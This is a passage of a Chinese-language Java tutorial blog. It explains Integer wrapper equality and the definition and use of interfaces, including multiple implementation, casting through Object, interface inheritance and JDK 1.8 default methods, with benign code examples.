&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="number">19.2</span>;<span class="comment">//double自动装箱为Double，向上转型为Object</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">num</span> <span class="operator">=</span> (Double) obj;<span class="comment">//向下转型为包装类，再自动拆箱</span></span><br><span class="line">        System.out.println(num * num);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">99</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">99</span>;</span><br><span class="line">        System.out.println(x == y);<span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">d</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        System.out.println(c == d);<span class="comment">//false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    以后进行包装类相等判断的时候一定要用equals()完成，而包装类本身也需要考虑占位的长度，如果超过了一位，那么就需要使用equals()比较，不超过的话==也可。</p><hr><h4 id="接口的定义与使用"><a href="#接口的定义与使用" class="headerlink" title="接口的定义与使用"></a>接口的定义与使用</h4><h5 id="接口基本定义"><a href="#接口基本定义" class="headerlink" title="接口基本定义"></a>接口基本定义</h5><p>​    抽象类与普通类相比最大的优势在于：可以实现对子类覆写方法的控制，但是在抽象类里面可能依然会保留有一些普通方法，而普通方法里面可能会涉及到一些安全或者隐私的问题，那么这样的话在开发中，如果要对外部隐藏全部的实现细节，则就可以通过接口来进行描述。</p><p>​    接口可以理解为一个纯粹的抽象类（最原始的定义接口之中是只包含有抽象方法与全局常量的），但是从JDK1.8开始，由于引入Lambda表达式的概念，所以接口的定义也得到了加强，除了抽象方法与全局常量之外，还可以定义普通方法或静态方法。如果从设计本身的角度来讲，接口之中的组成还是应该以<strong>抽象方法和全局常量</strong>为主。</p><p>​    在Java中接口主要使用interface关键字来进行定义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INFO</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;<span class="comment">//全局常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <strong>此时的接口肯定无法直接产生实例化对象，所以对于接口的使用原则如下：</strong></p><p>​    <strong>1、接口需要被子类实现（implements），一个子类可以实现多个父接口；</strong></p><p>​    <strong>2、子类（如果不是抽象类）那么一定要覆写接口之中的全部抽象方法；</strong></p><p>​    <strong>3、接口对象可以利用子类对象的向上转型进行实例化；</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INFO</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;<span class="comment">//全局常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;得到一个秘密的消息&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl</span>();</span><br><span class="line">        System.out.println(msg.getInfo());</span><br><span class="line">        System.out.println(IMessage.INFO);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    Java里使用接口主要的目的是一个子类可以实现多个接口，接口可以实现多继承的概念。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INFO</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;<span class="comment">//全局常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>;<span class="comment">//定义抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span>,IChannel&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.connect())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;得到一个秘密的消息&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;通道创建失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;消息发送通道已经建立&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl</span>();</span><br><span class="line">        System.out.println(msg.getInfo());</span><br><span class="line">        System.out.println(IMessage.INFO);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    但是这个时候就需要考虑一个实际的情况了，关于对象的转型问题了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073539.jpg"                      alt="image-20220623162103545"                ></p><p>​    此时MessageImpl子类的对象可以任意的实现父接口的转换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INFO</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;<span class="comment">//全局常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>;<span class="comment">//定义抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span>,IChannel&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.connect())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;得到一个秘密的消息&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;通道创建失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;消息发送通道已经建立&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl</span>();</span><br><span class="line">        <span class="type">IChannel</span> <span class="variable">chl</span> <span class="operator">=</span> (IChannel) msg;<span class="comment">//此时可以正常转型！</span></span><br><span class="line">        System.out.println(chl.connect());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    由于MessageImpl子类实现了IMessage与Channel两个接口，所以这个子类可以是这两个接口任意一个接口的实例，那么就表示此时这两个接口是可以相互转换的，但仅限于通过MessageImpl获取生成的实例。</p><p>​    在java里接口是绝对不允许去继承父类的，所以接口绝对不会是Object的子类，但是根据之前的分析可以发现，MessageImpl是Object的子类，所以接口一定可以通过Object接收。</p><p>​    观察Object于接口转换：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INFO</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;<span class="comment">//全局常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>;<span class="comment">//定义抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span>,IChannel&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.connect())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;得到一个秘密的消息&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;通道创建失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;消息发送通道已经建立&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> msg;<span class="comment">//向上转型</span></span><br><span class="line">        <span class="type">IChannel</span> <span class="variable">chan</span> <span class="operator">=</span> (IChannel) obj;</span><br><span class="line">        System.out.println(chan.connect());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    Object类对象可以接收所有数据类型，包括基本数据类型、类对象、接口对象、数组。</p><p>​    由于接口描述的是一个公共的定义标准，所以在接口之中所有的抽象方法的访问权限都是public，也就是说写与不写public都是一样的。默认都是public，所以在覆写的时候只能用public。</p><p>​    接口虽然已经成功的进行了定义，但是不要忽略在实际的开发过程中，实现接口的有可能是抽象类。一个抽象类可以实现多个接口，而一个普通类只能够继承一个抽象类并且可以实现多个接口，但是要求先继承后实现。</p><p>子类继承抽象类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">INFO</span> <span class="operator">=</span> <span class="string">&quot;mes9s0&quot;</span>;<span class="comment">//全局常量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>;<span class="comment">//定义抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">DatabaseAbstractImpl</span>&#123;</span><br><span class="line">    <span class="comment">//接口中才能省略，抽象类不能省略</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="type">boolean</span> <span class="title function_">getDatabaseConnection</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl</span> <span class="keyword">extends</span> <span class="title class_">DatabaseAbstractImpl</span> <span class="keyword">implements</span> <span class="title class_">IMessage</span>,IChannel&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.connect())&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.getDatabaseConnection()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;数据库得到一个秘密的消息&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;数据库消息无法访问&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;通道创建失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;消息发送通道已经建立&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">getDatabaseConnection</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test25</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl</span>();</span><br><span class="line">        System.out.println(msg.getInfo());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    虽然接口无法去继承一个父类，但是一个接口却可以通过extends继承若干个父接口，此时成为交接口的多继承。</p><p>实现接口的多继承：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于接口名称规范和类名称规范相同，所以为了区分一般在接口前加一个I</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage1</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getInfo</span><span class="params">()</span>;<span class="comment">//抽象方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IChannel1</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接口多继承</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IService</span> <span class="keyword">extends</span> <span class="title class_">IMessage1</span>,IChannel1&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">service</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">IService</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">service</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;获取消息服务&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test26</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage1</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageServiceImpl</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> msg;</span><br><span class="line">        <span class="type">MessageServiceImpl</span> <span class="variable">mes</span> <span class="operator">=</span> (MessageServiceImpl) obj;</span><br><span class="line">        System.out.println(mes.service());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在实际的开发之中，接口的使用往往有三种形式：</p><p>​    1、进行标准设置；</p><p>​    2、表示一种操作的能力；</p><p>​    3、暴露远程方法视图，这个一般在RPC分布式开发中使用。</p><h5 id="接口定义加强"><a href="#接口定义加强" class="headerlink" title="接口定义加强"></a>接口定义加强</h5><p>​    接口最早的主要特点是全部由抽象方法和全局常量所组成，如果项目设计不当，就会出现一个非常严重的问题。假如实现了写了1080个子类之后，发现接口设计不当，需要追加方法，那么需要拷贝1080份实现代码。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073540.jpg"                      alt="image-20220625142231751"                ></p><p>​    该操作是结构设计不当的结果，所以为了方便子类的修改，往往不会让子类直接实现接口，而是往中间追加一个过渡的抽象类。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073542.jpg"                      alt="image-20220625145546573"                ></p><p>​    在JDK1.8之后开始，为了解决接口设计的缺陷，所以在接口之中允许开发者定义普通方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">IMessage2</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">message</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新增的方法，是一个公共方法，都具备</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">default</span> <span class="type">boolean</span> <span class="title function_">connect</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;建立消息的发送通道&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MessageImpl2</span> <span class="keyword">implements</span> <span class="title class_">IMessage2</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">message</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;mes9s0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test27</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IMessage2</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MessageImpl2</span>();</span><br><span class="line">        <span class="keyword">if</span> (msg.connect())&#123;</span><br><span class="line">            System.out.println(msg.message());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    接口中的普通方法必须追加default的声明，但是需要提醒的是，该操作属于挽救功能，所以如果不是必须的情况下，不是设计的首选。</p><p>​    